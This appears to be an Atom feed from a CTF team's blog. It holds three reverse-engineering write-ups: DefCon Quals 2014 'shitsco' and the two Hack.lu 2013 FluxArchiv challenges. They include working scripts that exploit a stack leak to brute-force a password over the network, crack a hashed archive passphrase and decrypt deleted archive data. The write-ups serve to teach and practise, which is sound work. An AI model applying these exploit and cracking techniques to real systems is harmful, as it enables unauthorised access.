@@ -1,0 +1,412 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: reversing, | CaptchaFlag CTF Team]]></title>
+  <link href="http://www.captchaflag.com/blog/categories/reversing-/atom.xml" rel="self"/>
+  <link href="http://www.captchaflag.com/"/>
+  <updated>2014-10-28T16:35:43-04:00</updated>
+  <id>http://www.captchaflag.com/</id>
+  <author>
+    <name><![CDATA[Captchaflag]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[DefCon Quals 2014 - shitsco]]></title>
+    <link href="http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-shitsco/"/>
+    <updated>2014-05-23T14:10:00-04:00</updated>
+    <id>http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-shitsco</id>
+    <content type="html"><![CDATA[<h2>Analysis</h2>
+
+<p>We are basically provided with a Cisco IOS-like CLI:</p>
+
+<p>```bash
+stacks0n@ubuntu:/home/shitsco$ ~/Desktop/shitsco_c8b1aa31679e945ee64bde1bdb19d035 </p>
+
+<p>oooooooo8 oooo        o88    o8<br>
+888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo<br>
+ 888oooooo  888   888   888  888   888ooooooo  888     888 888     888 
+        888 888   888   888  888           888 888         888     888 
+o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88   </p>
+
+<p>Welcome to Shitsco Internet Operating System (IOS)
+For a command list, enter ?
+$ ?
+==========Available Commands==========
+|enable                               |
+|ping                                 |
+|tracert                              |
+|?                                    |
+|shell                                |
+|set                                  |
+|show                                 |
+|credits                              |</p>
+
+<h1>|quit                                 |</h1>
+
+<p>Type ? followed by a command for more detailed information
+$ ? enable
+enable: Enables administrator access, with the correct password.
+$ enable cisco
+Nope.  The password isn't cisco
+$ enable
+Please enter a password: cisco
+Nope.  The password isn't ciscp�
+```</p>
+
+<p>After spending some time reversing and playing on the CLI, a few key points:</p>
+
+<ul>
+<li>in enable mode, you can run a command to print the flag (stored in file on disk)</li>
+<li>to get into enable mode you need to know the password (stored on disk and read into a global variable)</li>
+<li>there is a global boolean for whether you are in enable mode or not</li>
+<li>you can get a leak of the stack when you type 'enable' without a password and let it ask you. if you password is 5+ chars, you'll notice some data leaked</li>
+</ul>
+
+<h2>Reversing</h2>
+
+<p>Notice in the following code, they do not null terminate the password. When the password is wrong, the printf will leak stack data. Fortunately for us, the result of the strcmp() will be leaked. That will allow us to brute force the password.</p>
+
+<p>```c
+int _<em>cdecl do</em>enable(const char **a1)
+{
+  char *v1; // ebx@2
+  char user_password[32]; // [sp+18h] [bp-34h]@2
+  int bMatch; // [sp+38h] [bp-14h]@3
+  int v5; // [sp+3Ch] [bp-10h]@1</p>
+
+<p>v5 = *MK<em>FP(<strong>GS</strong>, 0x14);
+  if ( *a1 )
+  {
+    v1 = user</em>password;
+    strncpy(user<em>password, *a1, 32u);
+  }
+  else
+  {
+    v1 = user</em>password;
+    <strong>printf<em>chk(1, &quot;Please enter a password: &quot;);
+    fflush(stdout);
+    get</em>password<em>from</em>user(0, (int)user<em>password, 32, '\n');
+  }
+  bMatch = strcmp(g</em>enable<em>password, v1);
+  if ( bMatch )
+  {
+    __printf</em>chk(1, &quot;Nope.  The password isn't %s\n&quot;, v1);
+  }
+  else
+  {
+    g<em>enable</em>mode = 1;
+    g<em>prompt = '#';
+    puts(&quot;Authentication Successful&quot;);
+  }
+  sub</em>8049090(a1);
+  return *MK_FP(</strong>GS__, 0x14) ^ v5;
+}
+```</p>
+
+<p>```c
+unsigned int _<em>cdecl get</em>password<em>from</em>user(int fd, char *dest, int size, char delim)
+{
+  unsigned int count; // ebx@1
+  char byte_read; // [sp+1Fh] [bp-1Dh]@3</p>
+
+<p>count = 0;
+  if ( size &gt; 0 )
+  {
+    while ( read(fd, &amp;byte<em>read, 1u) &gt; 0 )
+    {
+      if ( byte</em>read != delim )
+      {
+        dest[count++] = byte_read;
+        if ( count != size )
+          continue;
+      }
+      return count;
+    }
+    count = 0xFFFFFFFF;
+  }
+  return count;
+}
+```</p>
+
+<h2>Code</h2>
+
+<p>The result of strcmp() will either be 1 or -1, depending on whether s1 or s2 is
+bigger. By filling the buffer will '\x01', and guessing one character at a time
+from high to low, we will be able to determine the actual character when the leaked data byte changes.
+```python</p>
+
+<h1>!/usr/bin/env python</h1>
+
+<p>import socket</p>
+
+<p>def read_until(s, delim='$'):
+  line = &quot;&quot;
+  while True:
+    b = s.recv(1)
+    if b == delim:
+      break
+    line += b
+  return line</p>
+
+<p>def try<em>enable(s, password):
+  guess = 128
+  while guess &gt; 0:
+    s.send(&quot;enable\n&quot;)
+    read</em>until(s, ':')
+    s.send(password + chr(guess) + (31-len(password))*'\x01')
+    # find the first transition in which our guess
+    # is not higher than the target
+    if read<em>until(s, '$')[-2] != '\xff':
+      password += chr(guess)
+      s.send(&quot;enable &quot; + password + &quot;\n&quot;)
+      print repr(read</em>until(s, '$'))
+      return password
+    guess -= 1</p>
+
+<p>s = socket.socket()
+port = 31337
+s.connect(('shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me', port))
+done = False</p>
+
+<h1>skip banner</h1>
+
+<p>read<em>until(s, '$')
+password = ''
+while True:
+  password = try</em>enable(s, password)
+  print password
+s.close
+```</p>
+
+<h2>Solution</h2>
+
+<p>```bash
+$ enable bruT3m3hard3rb4by
+Authentication Successful</p>
+
+<h1>?</h1>
+
+<p>==========Available Commands==========
+|enable                               |
+|ping                                 |
+|tracert                              |
+|?                                    |
+|flag                                 |
+|shell                                |
+|set                                  |
+|show                                 |
+|credits                              |
+|quit                                 |</p>
+
+<h1>|disable                              |</h1>
+
+<p>Type ? followed by a command for more detailed information</p>
+
+<h1>flag</h1>
+
+<p>The flag is: Dinosaur vaginas
+```</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Hack.lu 2013 - Flux Archive Part 2]]></title>
+    <link href="http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-2/"/>
+    <updated>2013-10-27T15:46:00-04:00</updated>
+    <id>http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-2</id>
+    <content type="html"><![CDATA[<h2>Challenge</h2>
+
+<p>These sneaky humans! They do not just use one passcode, but two to enter the Festzelt. We heard that the passcode is hidden inside the archive file. It seems that the FluxFingers overrated their programming skill and had a major logical flaw in the archive file structure. Some of the drunken Oktoberfest humans found it and abused this flaw in order to transfer hidden messages. Find this passcode so we can finally drink their beer!</p>
+
+<h2>Analysis</h2>
+
+<p>Somewhere in the archive there is some hidden data. Playing around with the tool, I notice that when we delete archives the file size does not change. It must just leave the file entry data but delete the file itself.</p>
+
+<p>```bash
+% ./archiv -a myarchive.arc 123456 test </p>
+
+<p>FluxArchiv - solved security since 2007!
+Written by sqall - leading expert in social-kernel-web-reverse-engineering.</p>
+
+<p>Archiv myarchive.arc successfully created.</p>
+
+<p>Progress:
+0% ... 10% ... 20% ... 30% ... 40% ... 50% ... 60% ... 70% ... 80% ... 90% ... 100%</p>
+
+<p>File test successfully added to the archiv.</p>
+
+<p>% ls -al myarchive.arc
+-rw-rw-r-- 1 stacks0n stacks0n 2112 Oct 23 20:39 myarchive.arc</p>
+
+<p>% ./archiv -d myarchive.arc 123456 test </p>
+
+<p>FluxArchiv - solved security since 2007!
+Written by sqall - leading expert in social-kernel-web-reverse-engineering.</p>
+
+<p>File test successfully deleted from the archiv.</p>
+
+<p>% ls -al myarchive.arc
+-rw-rw-r-- 1 stacks0n stacks0n 2112 Oct 23 20:39 myarchive.arc
+```</p>
+
+<p>Looking at sanitizeFilename(), file entries begin at offset 0x20 and there is a magic value of &quot;FluXL1sT&quot;. The filenames are RC4 encrypted with the key being the SHA-1 sum of the archive password. Setting a breakpoint in sanitizeFilename() towards the end of the function, we notice a number of files that are simply empty string. It would appear that they are simply cleared out when deleted.</p>
+
+<p>I wonder if we can simply just encrypt a new filename and replace the entry to access the file without having to learn anything else about the file format. Turns out that I struggled with that, but when decrypting blocks in the file noticed my plaintext being displayed. So rather than actually figure out the format, lets just brute force decrypting blocks and see if we get lucky.</p>
+
+<p>```ruby</p>
+
+<h1>!/usr/bin/env ruby</h1>
+
+<p>require 'rc4'
+require 'digest/sha1'</p>
+
+<p>f = File.open(&quot;FluxArchiv.arc&quot;, &quot;r&quot;)
+success = false</p>
+
+<p>password = &quot;PWF41L&quot;
+key = Digest::SHA1.digest(password)
+offset = 0</p>
+
+<p>ciphertext = f.read(8)
+while offset &lt; f.size
+    f.seek(offset)
+    ciphertext = f.read(1024)
+    dec = RC4.new(key)
+    cleartext = dec.decrypt(ciphertext)</p>
+
+<pre><code>if cleartext.match(/^[\w\s]{6}/) and cleartext.match(/key|flag/i)
+    puts cleartext
+end
+
+offset += 8
+</code></pre>
+
+<p>end
+```</p>
+
+<h2>Solution</h2>
+
+<p>```bash
+% ruby fluxarchiv2.rb
+e electron and the switch, the
+beauty of the baud.  We make use of a service already existing without paying
+for what could be dirt-cheap if it wasn't run by profiteering gluttons, and
+you call us criminals.  We explore... and you call us criminals.  We seek
+after knowledge... and you call us criminals.  We exist without skin color,
+without nationality, without religious bias... and you call us criminals.
+You build atomic bombs, you wage wars, you murder, cheat, and lie to us
+and try to make us believe it's for our own good, yet we're the criminals.</p>
+
+<p>Yes, I am a criminal.  My crime is that of curiosity.  My crime is
+that of judging people by what they say and think, not what they look like.
+My crime is that of outsmarting you, something that you will never forgive me
+for.</p>
+
+<p>I am a hacker, and this is my manifesto.  You may stop this individual,
+but you can't stop us all... after all, we're all alike.</p>
+
+<p>+++The Mentor+++</p>
+
+<p>Flag: D3letinG-1nd3x_F4iL
+```</p>
+
+<p><code>D3letinG-1nd3x_F4iL</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Hack.lu 2013 - Flux Archive Part 1]]></title>
+    <link href="http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-1/"/>
+    <updated>2013-10-27T15:42:00-04:00</updated>
+    <id>http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-1</id>
+    <content type="html"><![CDATA[<h2>Challenge</h2>
+
+<p>These funny humans try to exclude us from the delicious beer of the Oktoberfest! They made up a passcode for everyone who wants to enter the Festzelt. Sadly, our human informant friend could not learn the passcode for us. But he heard a conversation between two drunken humans, that they were using the same passcode for this intercepted archive file. They claimed that the format is is absolutely secure and solves any kind of security issue. It's written by this funny hacker group named FluxFingers. Real jerks if you ask me. Anyway, it seems that the capability of drunken humans to remember things is limited. So they just used a 6 character passcode with only numbers and upper-case letters. So crack this passcode and get our ticket to their delicious german beer!</p>
+
+<p>Here is the challenge: https://ctf.fluxfingers.net/static/downloads/fluxarchiv/hacklu2013<em>archiv</em>challenge1.tar.gz</p>
+
+<h2>Analysis</h2>
+
+<p>Provided with a 64-bit ELF and a data file.</p>
+
+<p>```
+stacks0n@ubuntu:~/Desktop$ ./archiv</p>
+
+<p>FluxArchiv - solved security since 2007!
+Written by sqall - leading expert in social-kernel-web-reverse-engineering.</p>
+
+<p>Unknown or invalid command.</p>
+
+<p>Usage: ./archiv <command> <archiv> <password> <file>
+commands:
+-l <archiv> <password> - lists all files in the archiv.
+-a <archiv> <password> <file> - adds a file to the archiv (when archiv does not exist create a new archiv).
+-x <archiv> <password> <filename> - extracts the given filename from the archiv.
+-d <archiv> <password> <filename> - delete the given filename from the archiv.
+```</p>
+
+<p>Presumably, we could try to brute force the entire key space (36^6) but that might take a while when trying to execute the program. So let's look into some of the key functions. Tracing backwards from the output of &quot;Given password is not correct&quot; we target verifyArchiv()</p>
+
+<h3>verifyArchiv</h3>
+
+<p>This method reads 0x14 (20) bytes from the archive file starting at offset 0xC (12) which is our target hash to verify that the password is accurate. It starts by grabbing bytes from hash_password (SHA-1 sum of password) out of order, but in a predictable manner. Look at the python code for that order. Then, the byte stream of the hash is run through SHA-1 and compared against the target. Thus, we can brute force the entire key space only running the code necessary to find the target.</p>
+
+<h2>Code</h2>
+
+<p>```python</p>
+
+<h1>!/usr/bin/env python</h1>
+
+<p>import hashlib
+import string
+import itertools</p>
+
+<p>def bruteforce(charset, maxlength):
+    return (''.join(candidate)
+        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
+        for i in range(maxlength, maxlength + 1)))</p>
+
+<p>for attempt in bruteforce(string.digits + string.ascii<em>uppercase, 6):
+    hash = hashlib.sha1(attempt).digest()
+    hash</em>scramble = hash[0] + hash[7] + hash[14] + hash[1] + hash[8] + hash[15] + hash[2] + hash[9] + hash[16] + hash[3] + hash[10] + hash[17] + hash[4] + hash[11] + hash[18] + hash[5] + hash[12] + hash[19] + hash[6] + hash[13]
+    new<em>hash = hashlib.sha1(hash</em>scramble).hexdigest()
+    if new_hash == &quot;372942df2712824505d8171f4f0bcb14153d39ba&quot;:
+        print &quot;Found passphrase: &quot; + attempt
+        break
+```</p>
+
+<p>```
+stacks0n@ubuntu:~/Desktop$ python fluxarchiv.py 
+Found passphrase: PWF41L</p>
+
+<p>stacks0n@ubuntu:~/Desktop$ ./archiv -l FluxArchiv.arc PWF41L</p>
+
+<p>FluxArchiv - solved security since 2007!
+Written by sqall - leading expert in social-kernel-web-reverse-engineering.</p>
+
+<h2>Filename:                                               Size in archiv:</h2>
+
+<p>attentionzombie.mp3                                                     22 kB
+Did<em>You</em>Know.jpg                                                        139 kB
+fluxfingers.png                                                 9 kB
+th_oh-noes-everybody-panic.gif                                                  131 kB</p>
+
+<p>stacks0n@ubuntu:~/Desktop$ ls -alh attentionzombie.mp3 Did<em>You</em>Know.jpg fluxfingers.png th<em>oh-noes-everybody-panic.gif 
+-rw-rw-r-- 1 stacks0n stacks0n  23K Oct 23 04:30 attentionzombie.mp3
+-rw-rw-r-- 1 stacks0n stacks0n 135K Oct 23 04:30 Did</em>You<em>Know.jpg
+-rw-rw-r-- 1 stacks0n stacks0n 9.0K Oct 23 04:31 fluxfingers.png
+-rw-rw-r-- 1 stacks0n stacks0n 127K Oct 23 04:31 th</em>oh-noes-everybody-panic.gif
+```</p>
+
+<p>Nothing stands out as to what the flag might be. Okay, I'm dumb it is the password :)</p>
+
+<h2>Solution</h2>
+
+<p>PWF41L</p>
+]]></content>
+  </entry>
+  
+</feed>
